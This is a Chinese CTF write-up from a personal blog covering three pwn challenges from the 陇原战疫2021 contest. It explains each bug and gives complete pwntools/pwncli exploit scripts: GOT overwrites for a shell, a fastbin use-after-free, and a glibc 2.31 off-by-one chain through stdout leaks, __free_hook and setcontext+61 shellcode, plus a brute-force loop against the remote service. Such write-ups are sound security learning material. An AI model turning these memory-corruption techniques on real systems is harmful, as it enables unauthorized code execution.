# 陇原战疫2021网络安全大赛-pwn-wp



## 陇原战疫2021网络安全大赛-pwn-wp

今天正好有事情跟比赛冲突了，回到家已经八点多，花了一个小时左右做了三道`pwn`题，都是常规题。第四题忙活了半天没啥进展，想想还是先把前三题的`wp`写了。这里总结下每道题的解题思路：

- `bbbaby`：题如其名
  - 首先修改`__stack_chk_fail@got`为`puts@plt`，只要能继续往后执行`main`函数就行
  - 利用`main`函数栈帧的溢出泄露出`libc`地址
  - 修改`atoi@got`为`system`，执行下`get_int`，输入`/bin/sh`即可获得`shell`
- `Magic`：这题甚至都不需要给`libc`。题目加了很多无用的分支代码，需要花点时间分析下，其实题目很简单。
  - 有个空闲的`0x230`，应该是`fopen`分配出来的`IO_FILE`结构体。刚好能分配`5`个`0x70`。同时伪造一个`0x70`的`fastbin chunk`的头。
  - 利用`edit`部分写修改`fd`为伪造的`chunk`
  - 分配到`fake chunk`
  - 利用`edit`泄露出`flag`
- `h3apclass`：`libc-2.31`下的`off by one`与`setcontext+61`利用
  - 堆风水，获得一个`unsorted bin chunk`并制造`overlapped chunk`
  - 爆破`4bit`，概率为`1/16`。利用`tcache bin`分配到`_IO_2_1_stdout_`结构体上面，泄露`libc`地址
  - 同样的方式泄露`heap`地址。也可以直接用`__free_hook`附近的区域打，这样就不需要泄露堆地址
  - 利用`tcache bin attack`修改`__free_hook`为`mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]`
  - 最后用`setcontext+61`执行`mprotect`，然后跳转执行`cat('/flag')`的`shellcode`读取到`flag`

<!-- more -->

### bbbaby

#### checksec

![image-20211107234049915](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211107234049915.png)

#### 漏洞点

任意地址写：

![image-20211107234215669](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211107234215669.png)

`main`函数的栈溢出：

![image-20211107234245292](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211107234245292.png)



由于有`canary`，所以需要改掉`__stack_chk_fail@got`的内容

#### exp

```python
#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']
if gift['remote']:
    libc = ELF("./libc-2.23.so")

def write_any(addr, content):
    p.sendlineafter("your choice\n", "0")
    p.sendlineafter("address:\n", str(addr))
    p.sendafter("content:\n", content)


def stack_overflow(data):
    p.sendlineafter("your choice\n", "1")
    p.sendlineafter("size:\n", str(0x1000))
    p.sendafter("content:\n", data)

# change stack_chk

write_any(0x601020, p64(elf.plt.puts))

payload = flat({
    0x118:[
        0x0000000000400a03,
        elf.got.puts, 
        elf.plt.puts, 
        0x40086c,
        0x4007c7
    ]
})

stack_overflow(payload)

p.sendlineafter("your choice\n", "2")

libc_base = recv_libc_addr(p, offset=libc.sym.puts)
log_libc_base_addr(libc_base)
libc.address = libc_base

p.sendlineafter("address:\n", str(elf.got.atoi))
p.sendafter("content:\n", p64(libc.sym.system))

p.sendline("/bin/sh\x00")

get_flag_when_get_shell(p)

p.interactive()
```

远程打：

![image-20211107234500663](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211107234500663.png)

### Magic

#### checksec

![image-20211107234544927](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211107234544927.png)

给的`libc`版本为`2.23`

#### 漏洞点

`UAF`两处：

![image-20211107234646019](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211107234646019.png)

![image-20211107234737959](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211107234737959.png)

#### exp

```python
#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']

def add(idx):
    p.sendlineafter("Input your choice: \n", "1\n\n")
    p.sendlineafter("Input the idx\n", str(idx)+"\n\n")
    p.recvuntil("Search finished\n")


def edit(idx, data):
    p.sendlineafter("Input your choice: \n", "2\n\n")
    p.sendlineafter("Input the idx\n", str(idx)+"\n\n")
    p.sendafter("Input the Magic\n", data)
    p.recvuntil("Magic> ")
    m = p.recvuntil(" <Magic")
    info(f"Get msg: {m}")
    return m


def dele(idx):
    p.sendlineafter("Input your choice: \n", "3\n\n")
    p.sendlineafter("Input the idx\n", str(idx)+"\n\n")
    p.recvuntil("remove the Magic\n")


# alloc
add(0)
add(0)
add(0)
add(0)
add(1)

# prepare for a fake 0x70 chunk
edit(1, flat([0, 0, 0, 0x71]))
dele(1)
dele(0)

# partial overwrite 
edit(0, "\xe0")
add(0)
add(0)

# leak flag
edit(0, "a"*0x50)

p.interactive()
```

远程打：

![image-20211107234939433](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211107234939433.png)

### h3apclass

#### checksec

![image-20211107235035475](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211107235035475.png)

保护全开，然后`google`了一下，`libc`版本为`2.31-0ubuntu9.2_amd64`。

#### 漏洞点

![image-20211107235153925](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211107235153925.png)

#### exp

```python
#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']

context.update(timeout=3)

def add(idx, size, data="deadbeef"):
    p.sendlineafter("4:Drop homework\n", "1")
    p.sendlineafter("Which homework?\n", str(idx))
    p.sendlineafter("size:\n", str(size))
    p.sendafter("content:\n", data)

def edit(idx, data):
    p.sendlineafter("4:Drop homework\n", "3")
    p.sendlineafter("Which homework?\n", str(idx))
    p.sendafter("content:\n", data)


def dele(idx):
    p.sendlineafter("4:Drop homework\n", "4")
    p.sendlineafter("Which homework?\n", str(idx))

cat_flag = asm(shellcraft.amd64.linux.cat("/flag"))

# forge 0x500 chunk
add(0, 0x18, 0x18*"a")
add(1, 0xf8)
add(2, 0xf8)
add(3, 0xf8)
add(4, 0xf8)
add(5, 0xf8)
add(6, 0x18)

# free space
dele(6)
dele(5)
dele(4)
dele(3)
dele(2)

# chaneg size
edit(0, 0x18*"a" + "\x01\x05")
dele(1)

# consume 0x100
add(1, 0x70)
add(2, 0x70)

log_ex(f"Now try to attack stdout...")

if gift['debug']:
    payload = p16_ex(get_current_libcbase_addr() + libc.sym['_IO_2_1_stdout_'])
else:
    payload = p16_ex(0x86a0)

add(3, 0x70, payload)

# free space
dele(1)
dele(2)

add(1, 0xf8)

# leak libc addr
add(2, 0xf8, flat([
    0xfffffbad1887, 0, 0, 0, "\x00"
]))

libc_base = recv_libc_addr(p) - 0x1eb980
log_libc_base_addr(libc_base)
libc.address = libc_base

dele(1)
dele(0)

# leak heap addr
edit(3, p64(libc.sym['_IO_2_1_stdout_'])[:6])
add(0, 0x70)
add(1, 0x70, flat([
    0xfbad1887, 0, 0, 0, libc.sym['__curbrk']-8,libc.sym['__curbrk']+8
]))

m = p.recvn(16)
heap_base = u64_ex(m[8:]) - 0x21000
log_heap_base_addr(heap_base)

dele(0)
# change __free_hook
# 0x0000000000154930: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
edit(3, p64(libc.sym['__free_hook'])[:6])
add(0, 0x70, cat_flag)
add(4, 0x70, p64_ex(0x0000000000154930 + libc_base))

# read flag
cur_heap = heap_base + 0x1450

payload = flat({
    8: cur_heap,
    0x20: libc.sym['setcontext']+61,
    0x30: heap_base + 0x13d0,
    0xa0: cur_heap+0x30, # rsp
    0xa8: libc.sym['mprotect'],
    0x68: heap_base,
    0x70: 0x4000,
    0x88: 7
})

add(5, 0xe8, payload)

dele(5)

m = p.recvline_contains("flag")

if b"flag" in m:
    log_ex_highlight(f"Get flag: {m}")
    sleep(20)

p.close()
```

然后加一个`shell`脚本跑一会儿就能拿到`flag`了。

```shell
#!/bin/bash
for i in {1..10}
do
    python3 exp.py re ./H3apClass -p 25373 -nl
done
```

远程打：

![image-20211108000859215](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211108000859215.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://www.roderickchan.cn/zh-cn/2021-11-07-%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-pwn-wp/  

